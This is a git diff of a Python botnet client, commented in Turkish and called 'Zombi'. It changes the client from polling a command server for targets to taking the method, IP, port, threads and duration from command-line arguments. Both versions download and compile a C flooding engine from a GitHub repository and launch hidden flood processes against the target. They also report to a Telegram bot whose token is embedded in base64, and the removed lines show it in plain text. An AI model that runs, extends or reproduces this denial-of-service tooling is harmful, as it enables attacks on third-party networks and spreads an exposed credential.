@@ -1,20 +1,17 @@
 #!/usr/bin/env python3
 import os
-import time
+import sys
+import base64
 import requests
 import subprocess
-import base64
 
-# --- GÜVENLİK VE AYARLAR ---
-# Token: 8818747282:AAEHDDp6U8ZxE4Yi0l1Oeo9Nd-hMu7XuPLo
-# GitHub radarına takılmaması için Base64 ile şifrelendi
+# --- GÜVENLİK ---
+# Token ve ID gizlendi
 D_KEY = "ODgxODc0NzI4MjpBQUVIRERwNlU4WnhFNFlpMGwxT2VvOU5kLWhNdTdYdVBMbw=="
-MASTER_URL = "https://ordu-komutan-3.loca.lt" 
+MY_ID = "6614488737"
 ZOMBI_AD = f"Zombi-{os.uname()[1]}"
-MY_ID = "6614488737" # Kendi Telegram ID'ni buraya yaz (opsiyonel)
 
 def s_msg(text):
-    """Telegram bildirim fonksiyonu (Gizli Mod)"""
     try:
         t_kn = base64.b64decode(D_KEY).decode("utf-8")
         url = f"https://api.telegram.org/bot{t_kn}/sendMessage"
@@ -22,70 +19,44 @@ def s_msg(text):
     except:
         pass
 
-def temizlik_yap():
-    print("🧹 Eski mühimmatlar temizleniyor...")
-    # İz bırakmamak için her şeyi temizle
-    os.system("rm -f attack.py* slave.py* attack.log mermi mermi.c")
-    
-    print("📦 C-Engine çekiliyor...")
-    # GitHub'dan mermi.c'yi çek
+def motor_hazirla():
+    print("🧹 Temizlik ve C-Engine hazırlığı...")
+    os.system("rm -f mermi mermi.c")
     os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/mermi.c")
-    
-    print("🛠️ Mermi Çekirdeği derleniyor...")
-    # En yüksek optimizasyon (-O3) ile derleme
     derleme = os.system("gcc -O3 mermi.c -o mermi -lpthread")
-    
     if derleme == 0:
-        print("✅ C-Engine Hazır!")
         os.system("chmod +x mermi")
-        s_msg(f"🚀 {ZOMBI_AD} Uyandı! C-Engine namluya sürüldü.")
-    else:
-        print("❌ GCC Hatası!")
+        return True
+    return False
 
-def komut_dinle():
-    print(f"📡 Beyin Bağlantısı: {MASTER_URL}")
+def ates_et(method, target, port, threads, duration):
+    if not os.path.exists("./mermi"):
+        if not motor_hazirla(): return
+
+    print(f"\n🔥 MANUEL VURUŞ TETİKLENDİ!")
+    print(f"🚀 Metot: {method} | Hedef: {target}:{port}")
+    print(f"⚡ Kol: {threads} | Süre: {duration}s")
+
+    # Mermi.c'nin beklediği sıralama: method target port threads duration
+    attack_cmd = ["./mermi", str(method), str(target), str(port), str(threads), str(duration)]
     
-    while True:
-        try:
-            # Bypass tunnel uyarısı ve gizli user-agent
-            headers = {'bypass-tunnel-reminder': 'true', 'User-Agent': 'Zombi-Core-V3'}
-            response = requests.get(f"{MASTER_URL}/get_command", headers=headers, timeout=15)
-            
-            if response.status_code == 200:
-                data = response.json()
-                method = data.get("method")
-                target = data.get("target")
-                port = data.get("port")
-                t = data.get("threads")
-                s = data.get("duration")
-
-                if method and target:
-                    thread_sayisi = t if t else 150 # C-Engine için 150 kol ideal
-                    print(f"\n[!] EMİR GELDİ: {method.upper()} -> {target}")
-
-                    # Mermi kontrolü
-                    if not os.path.exists("./mermi"):
-                        os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/mermi.c")
-                        os.system("gcc -O3 mermi.c -o mermi -lpthread")
-
-                    attack_cmd = [
-                        "./mermi", 
-                        str(method), str(target), str(port), 
-                        str(thread_sayisi), str(s)
-                    ]
-                    
-                    # C Motorunu 2 koldan ateşle (Hattı sature eder)
-                    for _ in range(2):
-                        subprocess.Popen(attack_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    
-                    s_msg(f"🔥 {ZOMBI_AD} Ateş Başlattı!\n🎯 Hedef: {target}\n⚡ Güç: {method}")
-                    print(f"✅ Vuruş başladı, loglar gizlendi.")
-
-            time.sleep(5) # Beyni yormamak için 5 saniyede bir kontrol
-            
-        except Exception as e:
-            time.sleep(10)
+    # Maksimum hat verimi için 2 koldan C-Engine ateşle
+    for _ in range(2):
+        subprocess.Popen(attack_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+    s_msg(f"🏴‍☠️ {ZOMBI_AD} Ateş Başlattı!\n🎯 {target}\n🛠 {method} | {threads} Thread")
 
 if __name__ == "__main__":
-    temizlik_yap()
-    komut_dinle()
+    # SIRALAMA: method target ip port threads time
+    if len(sys.argv) < 6:
+        print("\n❌ SIRALAMA HATASI!")
+        print("Kullanım: python3 slave.py <METHOD> <IP> <PORT> <THREADS> <TIME>")
+        print("Örnek: python3 slave.py udpb3 1.1.1.1 80 3 300")
+    else:
+        metot = sys.argv[1]
+        ip = sys.argv[2]
+        port = sys.argv[3]
+        thr = sys.argv[4]
+        sure = sys.argv[5]
+        
+        ates_et(metot, ip, port, thr, sure)
